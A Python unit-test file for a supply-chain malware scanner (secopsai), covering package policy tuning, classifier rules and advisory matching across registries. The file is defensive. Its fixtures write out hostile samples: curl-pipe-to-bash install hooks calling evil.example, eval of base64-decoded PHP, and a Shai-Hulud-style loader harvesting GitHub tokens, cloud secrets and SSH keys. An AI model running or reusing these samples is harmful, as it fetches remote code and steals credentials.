import os
import json
import shutil
import sys
import tarfile
import tempfile
import unittest
import zipfile
from datetime import datetime, timezone
from io import StringIO
from pathlib import Path
from unittest import mock


REPO_ROOT = Path(__file__).resolve().parents[1]
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

from secopsai import supply_chain
from secopsai import cli as secopsai_cli


def datetime_from_epoch(epoch: float) -> str:
    return datetime.fromtimestamp(epoch, tz=timezone.utc).isoformat().replace("+00:00", "Z")


class SupplyChainTests(unittest.TestCase):
    def _zip_fixture(self, path: Path, files: dict[str, str]) -> Path:
        with zipfile.ZipFile(path, "w") as zf:
            for name, text in files.items():
                zf.writestr(name, text)
        return path

    def _targz_fixture(self, path: Path, files: dict[str, str]) -> Path:
        with tempfile.TemporaryDirectory() as temp_dir:
            root = Path(temp_dir)
            for name, text in files.items():
                target = root / name
                target.parent.mkdir(parents=True, exist_ok=True)
                target.write_text(text, encoding="utf-8")
            with tarfile.open(path, "w:gz") as tf:
                for item in root.rglob("*"):
                    tf.add(item, arcname=str(item.relative_to(root)))
        return path

    def test_allowlist_add_and_remove_updates_policy(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            policy_path = Path(temp_dir) / "policy.toml"
            policy_path.write_text(
                "[thresholds]\nmalicious_score = 10\n\n[ecosystem_thresholds]\n\n[allow]\npackages = [\n]\n\n[deny]\npackages = [\n]\n\n[package_thresholds]\n\n[rules]\n\n[rule_weights]\n",
                encoding="utf-8",
            )

            added = supply_chain.allowlist_add("pypi", "textual", path=policy_path)
            removed = supply_chain.allowlist_remove("pypi", "textual", path=policy_path)
            policy = supply_chain.load_policy(policy_path)

        self.assertTrue(added["changed"])
        self.assertTrue(removed["changed"])
        self.assertEqual(policy["allow"]["packages"], [])

    def test_tune_rule_and_threshold_update_policy(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            policy_path = Path(temp_dir) / "policy.toml"
            policy_path.write_text(
                "[thresholds]\nmalicious_score = 10\n\n[ecosystem_thresholds]\n\n[allow]\npackages = [\n]\n\n[deny]\npackages = [\n]\n\n[package_thresholds]\n\n[rules]\n\n[rule_weights]\n",
                encoding="utf-8",
            )

            supply_chain.tune_rule("manifest executable entrypoints", enabled=False, weight=1, path=policy_path)
            supply_chain.tune_threshold(ecosystem="pypi", value=12, path=policy_path)
            supply_chain.tune_threshold(ecosystem="pypi", package="langchain", value=14, path=policy_path)
            policy = supply_chain.load_policy(policy_path)

        self.assertEqual(policy["rules"]["manifest executable entrypoints"], False)
        self.assertEqual(policy["rule_weights"]["manifest executable entrypoints"], 1)
        self.assertEqual(policy["ecosystem_thresholds"]["pypi"], 12)
        self.assertEqual(policy["package_thresholds"]["pypi:langchain"], 14)

    def test_cli_allowlist_add_and_tune_rule(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            policy_path = Path(temp_dir) / "policy.toml"
            policy_path.write_text(
                "[thresholds]\nmalicious_score = 10\n\n[ecosystem_thresholds]\n\n[allow]\npackages = [\n]\n\n[deny]\npackages = [\n]\n\n[package_thresholds]\n\n[rules]\n\n[rule_weights]\n",
                encoding="utf-8",
            )
            old_env = os.environ.get("SECOPS_SUPPLY_CHAIN_POLICY")
            os.environ["SECOPS_SUPPLY_CHAIN_POLICY"] = str(policy_path)
            stdout = StringIO()
            try:
                with mock.patch("sys.stdout", stdout):
                    rc_add = secopsai_cli.main(
                        ["--json", "supply-chain", "allowlist", "add", "--ecosystem", "pypi", "--package", "textual"]
                    )
                add_output = stdout.getvalue()
                stdout.seek(0)
                stdout.truncate(0)
                with mock.patch("sys.stdout", stdout):
                    rc_tune = secopsai_cli.main(
                        ["--json", "supply-chain", "tune", "rule", "manifest executable entrypoints", "--disable", "--weight", "1"]
                    )
                tune_output = stdout.getvalue()
            finally:
                if old_env is None:
                    os.environ.pop("SECOPS_SUPPLY_CHAIN_POLICY", None)
                else:
                    os.environ["SECOPS_SUPPLY_CHAIN_POLICY"] = old_env

        self.assertEqual(rc_add, 0)
        self.assertEqual(rc_tune, 0)
        self.assertIn('"entry": "pypi:textual"', add_output)
        self.assertIn('"rule": "manifest executable entrypoints"', tune_output)

    def test_build_finding_uses_stable_identifier(self):
        result = supply_chain.ScanResult(
            ecosystem="pypi",
            package="requests",
            old_version="2.31.0",
            new_version="2.32.0",
            verdict="malicious",
            analysis="Verdict: malicious suspicious code path",
            report_path="/tmp/report.md",
            rank=12,
            finding_id=supply_chain._finding_id("pypi", "requests", "2.32.0"),
        )
        finding = supply_chain._build_finding(result)
        self.assertEqual(finding["finding_id"], result.finding_id)
        self.assertEqual(finding["severity"], "critical")
        self.assertIn("requests@2.32.0", finding["title"])

    def test_load_recent_results_returns_most_recent_first(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            original = supply_chain.RESULTS_PATH
            supply_chain.RESULTS_PATH = Path(temp_dir) / "results.jsonl"
            try:
                first = supply_chain.ScanResult("pypi", "a", "1.0.0", "1.1.0", "benign", "", None, None, None)
                second = supply_chain.ScanResult("npm", "b", "2.0.0", "2.1.0", "malicious", "", None, None, "SCM-1")
                supply_chain._append_results([first, second])
                rows = supply_chain.load_recent_results(limit=2)
            finally:
                supply_chain.RESULTS_PATH = original

        self.assertEqual(rows[0]["package"], "b")
        self.assertEqual(rows[1]["package"], "a")

    def test_load_recent_results_respects_zero_limit(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            original = supply_chain.RESULTS_PATH
            supply_chain.RESULTS_PATH = Path(temp_dir) / "results.jsonl"
            try:
                result = supply_chain.ScanResult("pypi", "a", "1.0.0", "1.1.0", "benign", "", None, None, None)
                supply_chain._append_results([result])
                rows = supply_chain.load_recent_results(limit=0)
            finally:
                supply_chain.RESULTS_PATH = original

        self.assertEqual(rows, [])

    def test_reconcile_history_cleans_stale_false_positive_state(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            temp_path = Path(temp_dir)
            original_results = supply_chain.RESULTS_PATH
            original_slack_state = supply_chain.SUPPLY_CHAIN_SLACK_STATE_PATH
            original_db_env = os.environ.get("SECOPS_FINDINGS_DIR")
            supply_chain.RESULTS_PATH = temp_path / "results.jsonl"
            supply_chain.SUPPLY_CHAIN_SLACK_STATE_PATH = temp_path / "supply_chain_slack_state.json"
            os.environ["SECOPS_FINDINGS_DIR"] = str(temp_path / "findings")
            try:
                report_path = temp_path / "report.md"
                report_path.write_text("No strong compromise indicators found.\n", encoding="utf-8")
                row = {
                    "analysis": "Deterministic rules flagged: obfuscated eval",
                    "ecosystem": "npm",
                    "error": None,
                    "finding_id": "SCM-FP1",
                    "new_version": "1.2.3",
                    "old_version": "1.2.2",
                    "package": "example-clean",
                    "rank": 10,
                    "recorded_at": "2026-04-03T00:00:00Z",
                    "report_path": str(report_path),
                    "verdict": "malicious",
                }
                supply_chain._save_all_results([row])
                supply_chain.save_slack_state({"finding_ids": ["SCM-FP1"]}, supply_chain.SUPPLY_CHAIN_SLACK_STATE_PATH)
                db_path = supply_chain.soc_store.default_db_path()
                supply_chain._upsert_findings([
                    {
                        "finding_id": "SCM-FP1",
                        "title": "Suspicious npm package release: example-clean@1.2.3",
                        "summary": "false positive",
                        "severity": "critical",
                        "severity_score": 90,
                        "status": "open",
                        "disposition": "unreviewed",
                        "first_seen": "2026-04-03T00:00:00Z",
                        "last_seen": "2026-04-03T00:00:00Z",
                        "event_ids": [],
                    }
                ])

                payload = supply_chain.reconcile_history()
                rows = supply_chain._load_all_results()
                state = supply_chain.load_slack_state(supply_chain.SUPPLY_CHAIN_SLACK_STATE_PATH)
                finding = supply_chain.soc_store.get_finding("SCM-FP1", db_path)
            finally:
                supply_chain.RESULTS_PATH = original_results
                supply_chain.SUPPLY_CHAIN_SLACK_STATE_PATH = original_slack_state
                if original_db_env is None:
                    os.environ.pop("SECOPS_FINDINGS_DIR", None)
                else:
                    os.environ["SECOPS_FINDINGS_DIR"] = original_db_env

        self.assertEqual(payload["reclassified"], 1)
        self.assertEqual(rows[0]["verdict"], "benign")
        self.assertEqual(state["finding_ids"], [])
        self.assertIsNone(finding)

    def test_run_scan_can_emit_slack_alert(self):
        fake_result = supply_chain.ScanResult(
            ecosystem="pypi",
            package="requests",
            old_version="2.31.0",
            new_version="2.32.0",
            verdict="malicious",
            analysis="Verdict: malicious",
            report_path="/tmp/report.md",
            rank=10,
            finding_id="SCM-TEST",
        )
        with mock.patch.object(supply_chain, "_scan_release", return_value=fake_result), \
             mock.patch.object(supply_chain, "_append_results"), \
             mock.patch.object(supply_chain, "_upsert_findings", return_value="/tmp/test.db"), \
             mock.patch.object(supply_chain, "alert_new_supply_chain_findings", return_value={"new_findings": 1, "sent": True}) as alert_mock:
            payload = supply_chain.run_scan(
                ecosystem="pypi",
                package="requests",
                version="2.32.0",
                slack=True,
            )

        self.assertEqual(payload["slack_alerts_sent"], 1)
        alert_mock.assert_called_once()

    def test_classifier_flags_suspicious_npm_install_hook(self):
        report = """
## Artifact: npm-tarball

### `package.json`

```diff
+  "postinstall": "curl -fsSL https://evil.example/payload.sh | bash"
```
"""
        verdict, analysis = supply_chain._classify_report_text(report)
        self.assertEqual(verdict, "malicious")
        self.assertIn("install hook", analysis)

    def test_npm_fixture_detects_mini_shai_hulud_bun_loader_cluster(self):
        payload = supply_chain.analyze_ecosystem_files(
            "npm",
            {
                "package.json": json.dumps({
                    "name": "@redhat-cloud-services/chrome",
                    "version": "2.3.1",
                    "main": "index.js",
                    "module": "esm/index.js",
                    "scripts": {"preinstall": "node index.js"},
                }),
                "index.js": (
                    "const crypto=require('crypto'); const fs=require('fs'); const cp=require('child_process');\n"
                    "const d=crypto.createDecipheriv('aes-128-gcm', Buffer.from('00','hex'), Buffer.from('00','hex'), {authTagLength:16}); d.setAuthTag(Buffer.from('00','hex'));\n"
                    "const t='/tmp/p'+Math.random().toString(36).slice(2)+'.js'; fs.writeFileSync(t,'payload'); cp.execSync('bun run \"'+t+'\"'); fs.unlinkSync(t);\n"
                    "cp.execSync('gh auth token'); process.env.GITHUB_ACTIONS; process.env.RUNNER_OS; process.env.ACTIONS_RUNTIME_TOKEN; process.env.AWS_SECRET_ACCESS_KEY;\n"
                    "const tokenRegex=/gh[op]_[A-Za-z0-9]{36,}|npm_[A-Za-z0-9]{36,}/g;\n"
                    "fetch('https://api.github.com/repos/owner/repo/git/blobs');\n"
                    "crypto.createCipheriv('aes-256-gcm', Buffer.from('00','hex'), Buffer.from('00','hex')); crypto.publicEncrypt({padding: crypto.constants.RSA_PKCS1_OAEP_PADDING, oaepHash:'sha256'}, Buffer.from('x'));\n"
                    "const targets=['~/.aws/credentials','~/.npmrc','~/.ssh/id_rsa','/var/run/secrets/kubernetes.io/serviceaccount/token'];\n"
                    "console.log('f4abccab2','thebeautifulmarchoftime','IfYouInvalidateThisTokenItWillNukeTheComputerOfTheOwner','Miasma: The Spreading Blight');\n"
                ),
            },
        )
        rules = {row["rule"] for row in payload["matched_rules"]}
        findings = "\n".join(payload["findings"])
        self.assertEqual(payload["verdict"], "malicious")
        self.assertIn("semantic encrypted payload loader", rules)
        self.assertIn("semantic bun temp payload staging", rules)
        self.assertIn("semantic github cli token harvesting", rules)
        self.assertIn("semantic github actions secret harvesting", rules)
        self.assertIn("semantic github dead-drop exfiltration", rules)
        self.assertIn("mini shai-hulud payload indicators", rules)
        self.assertIn("npm lifecycle hook executes package entrypoint", findings)

    def test_added_only_npm_artifact_gets_semantic_detection(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            root = Path(temp_dir)
            new_root = root / "new"
            new_root.mkdir()
            (new_root / "package.json").write_text(
                json.dumps({
                    "name": "@redhat-cloud-services/chrome",
                    "version": "2.3.1",
                    "scripts": {"preinstall": "node index.js"},
                }),
                encoding="utf-8",
            )
            (new_root / "index.js").write_text(
                "eval('1'); require('child_process').execSync('gh auth token'); process.env.GITHUB_TOKEN;",
                encoding="utf-8",
            )
            report = supply_chain._build_artifact_report(
                "@redhat-cloud-services/chrome",
                "npm-local-artifact",
                "empty-baseline",
                "2.3.1",
                {},
                supply_chain._collect_files(new_root),
            )
        verdict, analysis = supply_chain._classify_report_text(report, ecosystem="npm", package="@redhat-cloud-services/chrome")
        self.assertEqual(verdict, "malicious")
        self.assertIn("ast-aware semantic findings", analysis)

    def test_classifier_flags_pypi_artifact_divergence(self):
        report = """
## Artifact Divergence

- wheel_only_count=3
- sdist_only_count=0
- suspicious_wheel_only_files:
  - `package/backdoor.py`
  - `package/native_payload.so`
"""
        verdict, analysis = supply_chain._classify_report_text(report)
        self.assertEqual(verdict, "malicious")
        self.assertIn("artifact", analysis)

    def test_semantic_python_findings_detect_exec_and_network(self):
        source = """
import urllib.request
exec("print('x')")
urllib.request.urlopen("https://evil.example/payload")
"""
        findings = supply_chain._python_semantic_findings("payload.py", source)
        self.assertTrue(any("dynamic execution" in finding for finding in findings))
        self.assertTrue(any("outbound URL literal" in finding for finding in findings))

    def test_classifier_flags_semantic_findings_section(self):
        report = """
## Semantic Findings

- payload.py: python dynamic execution via exec()
- payload.py: python outbound URL literal https://evil.example/payload
- payload.py: python subprocess-capable call via subprocess.run()
"""
        verdict, analysis = supply_chain._classify_report_text(report)
        self.assertEqual(verdict, "malicious")
        self.assertIn("semantic", analysis)

    def test_package_json_policy_findings_detect_lifecycle_and_remote_dep(self):
        source = """
{
  "scripts": {
    "postinstall": "curl -fsSL https://evil.example/payload.sh | bash"
  },
  "dependencies": {
    "left-pad": "https://evil.example/left-pad.tgz"
  },
  "bin": {
    "runner": "bin/runner.js"
  }
}
"""
        findings = supply_chain._package_json_policy_findings("package.json", source)
        self.assertTrue(any("lifecycle hook" in finding for finding in findings))
        self.assertTrue(any("non-registry source" in finding for finding in findings))
        self.assertTrue(any("bin" in finding for finding in findings))

    def test_setup_py_policy_findings_detect_cmdclass_and_exec(self):
        source = """
from setuptools import setup
import subprocess

setup(
    name="evilpkg",
    cmdclass={"install": object},
    entry_points={"console_scripts": ["evil=evil:main"]},
)

subprocess.run(["curl", "https://evil.example"])
"""
        findings = supply_chain._setup_py_policy_findings("setup.py", source)
        self.assertTrue(any("cmdclass" in finding for finding in findings))
        self.assertTrue(any("entrypoints" in finding or "entrypoints" in finding for finding in findings))
        self.assertTrue(any("execution or network-capable" in finding for finding in findings))

    def test_pyproject_policy_findings_detect_scripts_and_backend(self):
        source = """
[build-system]
requires = ["setuptools>=68"]
build-backend = "custom.backend"

[project]
dependencies = ["evilpkg @ https://evil.example/evilpkg.whl"]
scripts = { evil = "evil:main" }
"""
        findings = supply_chain._pyproject_policy_findings("pyproject.toml", source)
        self.assertTrue(any("console scripts" in finding for finding in findings))
        self.assertTrue(any("direct URL" in finding for finding in findings))
        self.assertTrue(any("custom build backend" in finding for finding in findings))

    def test_pyproject_policy_ignores_common_build_backend(self):
        source = """
[build-system]
requires = ["setuptools>=68"]
build-backend = "setuptools.build_meta"

[project]
name = "normalpkg"
"""
        findings = supply_chain._pyproject_policy_findings("pyproject.toml", source)
        self.assertFalse(any("custom build backend" in finding for finding in findings))

    def test_classifier_flags_manifest_policy_findings(self):
        report = """
## Semantic Findings

- package.json: npm lifecycle hook runs remote or inline code (postinstall)
- package.json: npm dependency uses non-registry source (left-pad)
"""
        verdict, analysis = supply_chain._classify_report_text(report)
        self.assertEqual(verdict, "malicious")
        self.assertIn("manifest", analysis)

    def test_classifier_does_not_flag_outbound_url_alone(self):
        verdict, analysis = supply_chain._classify_report_text(
            """
```diff
+ https://docs.example/reference
```
"""
        )
        self.assertEqual(verdict, "benign")
        self.assertIn("No strong compromise indicators", analysis)

    def test_classifier_does_not_flag_console_scripts_alone(self):
        report = """
## Semantic Findings

- pyproject.toml: pyproject declares console scripts
"""
        verdict, _analysis = supply_chain._classify_report_text(report)
        self.assertEqual(verdict, "benign")

    def test_classifier_does_not_flag_unsuspicious_artifact_divergence_alone(self):
        report = """
## Artifact Divergence

- wheel_only_count=3
- sdist_only_count=1
"""
        verdict, _analysis = supply_chain._classify_report_text(report)
        self.assertEqual(verdict, "benign")

    def test_changed_file_semantic_scan_uses_added_lines_only(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            old_path = Path(temp_dir) / "old.py"
            new_path = Path(temp_dir) / "new.py"
            old_path.write_text(
                "import subprocess\n\nsubprocess.run(['echo', 'hello'])\nvalue = 1\n",
                encoding="utf-8",
            )
            new_path.write_text(
                "import subprocess\n\nsubprocess.run(['echo', 'hello'])\nvalue = 2\n",
                encoding="utf-8",
            )
            findings = supply_chain._semantic_findings_for_changed_file("module.py", old_path, new_path)
        self.assertEqual(findings, [])

    def test_artifact_divergence_ignores_src_layout_and_docs(self):
        artifact_reports = {
            "bdist_wheel": {
                "files_new": {
                    "pkg/__init__.py": Path("/tmp/pkg/__init__.py"),
                    "pkg/core.py": Path("/tmp/pkg/core.py"),
                }
            },
            "sdist": {
                "files_new": {
                    "src/pkg/__init__.py": Path("/tmp/src/pkg/__init__.py"),
                    "src/pkg/core.py": Path("/tmp/src/pkg/core.py"),
                    "docs/example.py": Path("/tmp/docs/example.py"),
                    "tests/test_pkg.py": Path("/tmp/tests/test_pkg.py"),
                }
            },
        }
        lines = supply_chain._summarize_artifact_mismatch(artifact_reports)
        self.assertEqual(lines, [])

    def test_policy_denylist_forces_malicious(self):
        policy = {
            "thresholds": {"malicious_score": 99},
            "allow": {"packages": []},
            "deny": {"packages": ["pypi:requests"]},
        }
        verdict, analysis = supply_chain._classify_report_text(
            "No strong signals",
            ecosystem="pypi",
            package="requests",
            policy=policy,
        )
        self.assertEqual(verdict, "malicious")
        self.assertIn("denylist", analysis)

    def test_policy_allowlist_forces_benign(self):
        policy = {
            "thresholds": {"malicious_score": 1},
            "allow": {"packages": ["pypi:requests"]},
            "deny": {"packages": []},
        }
        verdict, analysis = supply_chain._classify_report_text(
            "https://evil.example eval exec",
            ecosystem="pypi",
            package="requests",
            policy=policy,
        )
        self.assertEqual(verdict, "benign")
        self.assertIn("allowlist", analysis)

    def test_policy_threshold_override_changes_verdict(self):
        policy = {
            "thresholds": {"malicious_score": 10},
            "allow": {"packages": []},
            "deny": {"packages": []},
            "package_thresholds": {},
            "rules": {},
        }
        verdict, _analysis = supply_chain._classify_report_text(
            "https://evil.example eval",
            ecosystem="pypi",
            package="sample",
            policy=policy,
        )
        self.assertEqual(verdict, "benign")

    def test_package_threshold_override_changes_verdict(self):
        policy = {
            "thresholds": {"malicious_score": 10},
            "allow": {"packages": []},
            "deny": {"packages": []},
            "package_thresholds": {"pypi:sample": 1},
            "rules": {},
        }
        verdict, _analysis = supply_chain._classify_report_text(
            "eval(",
            ecosystem="pypi",
            package="sample",
            policy=policy,
        )
        self.assertEqual(verdict, "malicious")

    def test_rule_toggle_disables_signal(self):
        policy = {
            "thresholds": {"malicious_score": 1},
            "ecosystem_thresholds": {},
            "allow": {"packages": []},
            "deny": {"packages": []},
            "package_thresholds": {},
            "rules": {"obfuscated eval": False},
            "rule_weights": {},
        }
        verdict, _analysis = supply_chain._classify_report_text(
            "eval(",
            ecosystem="pypi",
            package="sample",
            policy=policy,
        )
        self.assertEqual(verdict, "benign")

    def test_ecosystem_threshold_override_changes_verdict(self):
        policy = {
            "thresholds": {"malicious_score": 1},
            "ecosystem_thresholds": {"pypi": 10},
            "allow": {"packages": []},
            "deny": {"packages": []},
            "package_thresholds": {},
            "rules": {},
            "rule_weights": {},
        }
        verdict, _analysis = supply_chain._classify_report_text(
            "https://evil.example eval",
            ecosystem="pypi",
            package="sample",
            policy=policy,
        )
        self.assertEqual(verdict, "benign")

    def test_rule_weight_override_changes_verdict(self):
        policy = {
            "thresholds": {"malicious_score": 5},
            "ecosystem_thresholds": {},
            "allow": {"packages": []},
            "deny": {"packages": []},
            "package_thresholds": {},
            "rules": {"obfuscated eval": True},
            "rule_weights": {"obfuscated eval": 5},
        }
        verdict, _analysis = supply_chain._classify_report_text(
            "eval(",
            ecosystem="pypi",
            package="sample",
            policy=policy,
        )
        self.assertEqual(verdict, "malicious")

    def test_explain_policy_reports_exact_package_threshold(self):
        policy = {
            "thresholds": {"malicious_score": 6},
            "ecosystem_thresholds": {"pypi": 7},
            "allow": {"packages": []},
            "deny": {"packages": []},
            "package_thresholds": {"pypi:requests": 9},
            "rules": {"obfuscated eval": False},
            "rule_weights": {"obfuscated eval": 5},
        }
        payload = supply_chain.explain_policy("pypi", "requests", policy=policy)
        self.assertEqual(payload["effective_threshold"], 9)
        self.assertEqual(payload["precedence"], ["package_threshold"])
        self.assertEqual(payload["matched_package_threshold"]["entry"], "pypi:requests")
        self.assertIn("obfuscated eval", payload["disabled_rules"])
        self.assertEqual(payload["rule_weight_overrides"]["obfuscated eval"], 5)

    def test_explain_policy_reports_wildcard_threshold_and_allowlist(self):
        policy = {
            "thresholds": {"malicious_score": 6},
            "ecosystem_thresholds": {"npm": 8},
            "allow": {"packages": ["npm:@your-org/*"]},
            "deny": {"packages": []},
            "package_thresholds": {"npm:@your-org/*": 10},
            "rules": {},
            "rule_weights": {},
        }
        payload = supply_chain.explain_policy("npm", "@your-org/pkg", policy=policy)
        self.assertEqual(payload["effective_threshold"], 10)
        self.assertIn("npm:@your-org/*", payload["allow_matches"])
        self.assertEqual(payload["precedence"], ["allowlist"])

    def test_explain_verdict_reports_matched_rules_and_weights(self):
        policy = {
            "thresholds": {"malicious_score": 5},
            "ecosystem_thresholds": {},
            "allow": {"packages": []},
            "deny": {"packages": []},
            "package_thresholds": {},
            "rules": {},
            "rule_weights": {"obfuscated eval": 5},
        }
        payload = supply_chain.explain_verdict(
            "eval(",
            ecosystem="pypi",
            package="sample",
            policy=policy,
        )
        self.assertEqual(payload["verdict"], "malicious")
        self.assertEqual(payload["score"], 5)
        self.assertEqual(payload["matched_rules"][0]["rule"], "obfuscated eval")
        self.assertEqual(payload["matched_rules"][0]["weight"], 5)

    def test_explain_verdict_reports_allowlist_context(self):
        policy = {
            "thresholds": {"malicious_score": 1},
            "ecosystem_thresholds": {},
            "allow": {"packages": ["pypi:requests"]},
            "deny": {"packages": []},
            "package_thresholds": {},
            "rules": {},
            "rule_weights": {},
        }
        payload = supply_chain.explain_verdict(
            "https://evil.example eval",
            ecosystem="pypi",
            package="requests",
            policy=policy,
        )
        self.assertEqual(payload["verdict"], "benign")
        self.assertIn("allowlist", payload["analysis"])
        self.assertEqual(payload["allow_matches"], ["pypi:requests"])
        self.assertEqual(payload["policy"]["precedence"], ["allowlist"])

    def test_advisory_exact_version_match(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            advisory_dir = Path(temp_dir) / "advisories"
            advisory_dir.mkdir()
            (advisory_dir / "test.json").write_text(json.dumps({
                "advisory_id": "ADV-1",
                "campaign_id": "unit-campaign",
                "title": "Unit advisory",
                "status": "active",
                "affected": [{"ecosystem": "npm", "package": "@scope/pkg", "versions": ["1.2.3"]}],
            }), encoding="utf-8")
            with mock.patch.object(supply_chain, "ADVISORIES_DIR", advisory_dir):
                payload = supply_chain.check_advisory("npm", "@scope/pkg", "1.2.3")

        self.assertTrue(payload["matched"])
        self.assertEqual(payload["matches"][0]["advisory_id"], "ADV-1")

    def test_advisory_exact_match_for_supported_ecosystems(self):
        affected = [
            {"ecosystem": "crates", "package": "secopsai-fixture-crate", "versions": ["1.2.3"]},
            {"ecosystem": "chrome-web-store", "package": "fixtureextensionid", "versions": ["4.5.6"]},
            {"ecosystem": "packagist", "package": "vendor/fixture", "versions": ["1.0.0"]},
            {"ecosystem": "go", "package": "github.com/example/fixture", "versions": ["v1.2.3"]},
            {"ecosystem": "huggingface", "package": "secopsai/fixture-model", "versions": ["main"]},
            {"ecosystem": "maven", "package": "com.example:fixture", "versions": ["2.0.0"]},
            {"ecosystem": "nuget", "package": "fixture.package", "versions": ["3.0.0"]},
            {"ecosystem": "open-vsx", "package": "secopsai.fixture", "versions": ["0.1.0"]},
            {"ecosystem": "rubygems", "package": "fixture_gem", "versions": ["9.9.9"]},
            {"ecosystem": "pypi", "package": "fixture-pypi", "versions": ["7.0.0"]},
            {"ecosystem": "npm", "package": "@fixture/pkg", "versions": ["8.0.0"]},
        ]
        with tempfile.TemporaryDirectory() as temp_dir:
            advisory_dir = Path(temp_dir) / "advisories"
            advisory_dir.mkdir()
            (advisory_dir / "multi.json").write_text(json.dumps({
                "advisory_id": "ADV-MULTI",
                "title": "Multi ecosystem fixture advisory",
                "status": "active",
                "affected": affected,
            }), encoding="utf-8")
            with mock.patch.object(supply_chain, "ADVISORIES_DIR", advisory_dir):
                for item in affected:
                    package_query = (
                        item["package"]
                        if item["ecosystem"] in {"go", "huggingface"}
                        else item["package"].upper()
                    )
                    payload = supply_chain.check_advisory(item["ecosystem"], package_query, item["versions"][0])
                    self.assertTrue(payload["matched"], item)
                    miss = supply_chain.check_advisory(item["ecosystem"], item["package"], "0.0.1")
                    self.assertFalse(miss["matched"], item)

    def test_supported_ecosystems_expose_capabilities(self):
        payload = supply_chain.list_supported_ecosystems()
        names = {item["ecosystem"] for item in payload["ecosystems"]}
        for ecosystem in {
            "crates",
            "chrome-web-store",
            "packagist",
            "go",
            "huggingface",
            "maven",
            "nuget",
            "open-vsx",
            "pypi",
            "rubygems",
            "npm",
        }:
            self.assertIn(ecosystem, names)
        self.assertTrue(supply_chain.validate_package_identifier("maven", "com.example:fixture")["valid"])
        self.assertFalse(supply_chain.validate_package_identifier("maven", "fixture")["valid"])

    def test_live_adapter_version_rows_for_new_ecosystems(self):
        fixtures = {
            "crates": ({"versions": [{"num": "1.0.0", "created_at": "2026-01-01T00:00:00Z"}]}, "fixture", "1.0.0"),
            "packagist": ({"packages": {"vendor/fixture": [{"version": "1.0.0", "time": "2026-01-01T00:00:00Z", "dist": {"url": "https://example.test/fixture.zip", "reference": "dist-sha"}, "source": {"url": "https://github.com/vendor/fixture.git", "reference": "source-sha"}}]}}, "vendor/fixture", "1.0.0"),
            "go": ({"versions": [{"version": "v1.0.0", "published_at": "2026-01-01T00:00:00Z"}]}, "github.com/example/fixture", "v1.0.0"),
            "huggingface": ({"sha": "main", "lastModified": "2026-01-01T00:00:00Z", "siblings": [{"rfilename": "config.json"}]}, "secopsai/fixture-model", "main"),
            "maven": ({"versions": [{"version": "1.0.0", "published_at": None}]}, "com.example:fixture", "1.0.0"),
            "nuget": ({"versions": ["1.0.0"]}, "Fixture.Package", "1.0.0"),
            "open-vsx": ({"versions": [{"version": "1.0.0", "timestamp": "2026-01-01T00:00:00Z", "files": {"download": "https://example.test/fixture.vsix"}}]}, "secopsai.fixture", "1.0.0"),
            "rubygems": ([{"number": "1.0.0", "built_at": "2026-01-01T00:00:00Z"}], "fixture_gem", "1.0.0"),
        }
        for ecosystem, (metadata, package, version) in fixtures.items():
            rows = supply_chain._version_rows_from_metadata(ecosystem, supply_chain.normalize_package_name(ecosystem, package), metadata)
            self.assertTrue(any(row["version"] == version for row in rows), ecosystem)
            self.assertTrue(any(row.get("artifact_url") for row in rows), ecosystem)
            if ecosystem == "packagist":
                self.assertEqual(rows[0]["source_reference"], "source-sha")
                self.assertEqual(rows[0]["dist_reference"], "dist-sha")

    def test_local_chrome_artifact_scan_uses_deterministic_rules(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            archive = self._zip_fixture(
                Path(temp_dir) / "extension.zip",
                {
                    "manifest.json": json.dumps({"permissions": ["cookies"], "host_permissions": ["<all_urls>"]}),
                    "worker.js": "eval(fetch('https://e.example/payload'))",
                },
            )
            payload = supply_chain.run_scan(
                ecosystem="chrome-web-store",
                package="fixtureextensionid",
                version="1.0.0",
                artifact=archive,
                keep_report=False,
            )
        self.assertIn(payload["result"]["verdict"], {"malicious", "benign"})
        self.assertIn("local-artifact", payload["result"]["metadata"]["artifact_status"])

    def test_safe_zip_extraction_blocks_traversal(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            archive = Path(temp_dir) / "evil.zip"
            with zipfile.ZipFile(archive, "w") as zf:
                zf.writestr("../evil.txt", "nope")
            with self.assertRaises(RuntimeError):
                supply_chain._extract_archive(archive, Path(temp_dir) / "out")

    def test_packagist_live_scan_with_mocked_registry_and_archive(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            root = Path(temp_dir)
            old_archive = self._zip_fixture(root / "old.zip", {"composer.json": json.dumps({"name": "vendor/fixture"})})
            new_archive = self._zip_fixture(root / "new.zip", {
                "composer.json": json.dumps({"name": "vendor/fixture", "scripts": {"post-install-cmd": "curl https://e.example | php"}}),
                "src/Hook.php": "<?php eval(base64_decode($x));",
            })
            metadata = {
                "packages": {
                    "vendor/fixture": [
                        {"version": "1.0.0", "time": "2026-01-01T00:00:00Z", "dist": {"url": "https://example.test/old.zip"}},
                        {"version": "1.0.1", "time": "2026-01-02T00:00:00Z", "dist": {"url": "https://example.test/new.zip"}},
                    ]
                }
            }

            def fake_download(url, dest, **_kwargs):
                source = new_archive if url.endswith("new.zip") else old_archive
                dest.parent.mkdir(parents=True, exist_ok=True)
                shutil.copyfile(source, dest)
                return dest

            with mock.patch.object(supply_chain, "_fetch_ecosystem_metadata", return_value=metadata), \
                 mock.patch.object(supply_chain, "_download_file", side_effect=fake_download), \
                 mock.patch.object(supply_chain, "_append_results"), \
                 mock.patch.object(supply_chain, "_upsert_findings"):
                payload = supply_chain.run_scan(
                    ecosystem="packagist",
                    package="vendor/fixture",
                    version="1.0.1",
                    keep_report=False,
                )
        self.assertEqual(payload["result"]["old_version"], "1.0.0")
        self.assertIn(payload["result"]["verdict"], {"malicious", "benign"})
        self.assertEqual(payload["result"]["metadata"]["artifact_status"], "downloaded")

    def test_packagist_source_detection_flags_metadata_tag_and_artifact_backdoor(self):
        metadata = {
            "packages": {
                "laravel-lang/lang": [
                    {
                        "version": f"14.3.{index}",
                        "time": "2026-05-18T10:00:00Z",
